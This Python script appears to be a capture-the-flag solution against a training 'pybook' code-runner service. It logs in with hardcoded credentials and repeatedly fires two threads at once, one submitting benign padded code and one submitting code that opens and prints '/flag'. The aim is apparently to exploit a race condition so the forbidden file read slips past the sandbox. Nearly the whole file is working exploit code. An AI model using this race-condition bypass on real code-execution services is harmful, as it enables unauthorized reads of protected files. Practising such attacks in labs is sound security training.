#! /usr/bin/python3
import threading
import time
import requests


proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
}


def login(session):
    login_info = {"username": "ciaone", "password": "ciaone"}
    session.post("http://pybook.training.jinblack.it/login", data=login_info,)


def send_safe(session, safe_code):
    result = session.post("http://pybook.training.jinblack.it/run", data=safe_code, )
    if "flag" in result.text:
        print(result.text)


def send_unsafe(session, unsafe_code):
    result = session.post("http://pybook.training.jinblack.it/run", data=unsafe_code,)
    if "flag" in result.text:
        print(result.text)


safe_code = """
i=1
"""
safe_code += safe_code + 200*"\na=3"
unsafe_code = """
file = open('/flag','r')
for i in file:
    print(i)
      """
while True:
    session = requests.Session()
    login(session)
    t1 = threading.Thread(target=send_safe, args=(session, safe_code))
    t2 = threading.Thread(target=send_unsafe, args=(session, unsafe_code))
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    time.sleep(0.2)
